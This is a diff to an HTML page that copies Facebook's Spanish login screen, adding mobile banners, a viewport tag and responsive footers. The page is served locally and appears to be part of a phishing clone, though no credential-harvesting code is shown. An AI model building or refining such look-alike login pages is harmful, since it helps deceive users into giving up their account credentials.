@@ -3,6 +3,7 @@
 <head>
 	<title>Iniciar sesión en Facebook | Facebook</title>
 	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<link rel="shortcut icon" type="image/ico" href="favicon.ico"/>
 	<link rel="shortcut icon" type="image/ico" href="http://127.0.0.1/favicon.ico"/>
 	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
@@ -15,7 +16,7 @@
 		<div class="geder">
 			<p>
 				<a href="index.html" class="logo">
-					<img src="images/logo.png" alt="Ir a la página de inicio de Facebook" width="175px">
+					<img src="images/logo.png" alt="Ir a la página de inicio de Facebook">
 				</a>
 				<a class="register" href="#">
 					Registrarte
@@ -23,7 +24,22 @@
 			</p>
 		</div>
 	</header>
+	<div class="clearfix"></div>
 	<section class="container">
+		<div class="mobile-app">
+			<div class="info android">
+				<img src="http://i.imgur.com/3HwxdId.png" alt="">
+				<p>Descarga Facebook para Android y navega más rápido</p>
+			</div>
+			<div class="info windows">
+				<img src="http://i.imgur.com/3HwxdId.png" alt="">
+				<p>Descarga Facebook para Windows Phone y navega más rápido</p>
+			</div>
+			<div class="info iphone">
+				<img src="http://i.imgur.com/3HwxdId.png" alt="">
+				<p>Descarga Facebook para iPhone y navega más rápido</p>
+			</div>
+		</div>
 		<div class="form-wrapper">
 			<form method="POST" class="login-form">
 				<h3>Inicia sesión en Facebook</h3>
@@ -45,8 +61,11 @@
 		</div>
 	</section>
 	<footer>
-		<a href="#">
+		<a href="#" class="desktop">
 			<img src="images/footer.jpeg" alt="" />
+		</a>
+		<a href="#" class="mobile">
+			<img src="images/footer-mobile.png" alt="">
 		</a>
 	</footer>
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"
